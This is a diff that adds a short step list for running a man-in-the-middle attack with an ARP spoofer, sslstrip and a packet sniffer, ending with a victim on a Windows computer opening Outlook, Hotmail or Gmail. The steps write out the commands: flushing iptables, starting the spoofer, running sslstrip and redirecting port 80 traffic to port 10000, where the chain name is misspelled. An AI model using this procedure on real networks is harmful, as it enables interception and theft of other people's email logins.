@@ -1,0 +1,14 @@
+Steps:
+
+1. Open ARP spoofer folder in terminal.
+2. Flush iptables using (iptables --flush)
+3. Start the program using (python arp_spoof.py)
+
+4. Open other terminal and go to the same folder of arp spoofer.
+5. Run sslstrip
+
+6. Open another terminal and go to folder of Packer Sniffer program.
+7. Type the command : iptables -t nat -A REROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+8. Run the packet sniffer program using (python packet_sniffer.py)
+
+9. Go to windows computer now and try to open any https email site like outlook, hotmail or gmail and it should work.
